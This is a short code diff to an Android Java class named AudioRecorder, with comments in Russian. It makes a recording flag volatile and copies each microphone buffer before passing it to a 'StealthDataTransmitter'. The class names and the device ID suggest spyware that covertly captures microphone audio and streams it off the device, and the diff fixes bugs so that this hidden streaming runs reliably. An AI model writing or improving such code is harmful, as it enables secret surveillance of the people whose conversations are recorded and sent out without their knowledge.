@@ -18,7 +18,7 @@ public class AudioRecorder {
 
     private AudioRecord audioRecord;
     private Thread recordingThread;
-    private boolean isRecording = false;
+    private volatile boolean isRecording = false; // Bug #20: volatile для thread visibility
     private StealthDataTransmitter dataTransmitter;
     private String deviceId;
     private int bufferSize;
@@ -92,7 +92,9 @@ public class AudioRecorder {
                     int bytesRead = audioRecord.read(buffer, 0, buffer.length);
 
                     if (bytesRead > 0) {
-                        dataTransmitter.sendAudioData(buffer);
+                        // Bug #19: Копируем буфер чтобы избежать перезаписи при асинхронной отправке
+                        byte[] copy = java.util.Arrays.copyOf(buffer, bytesRead);
+                        dataTransmitter.sendAudioData(copy);
 
                         try {
                             Thread.sleep(40); // 40ms пауза
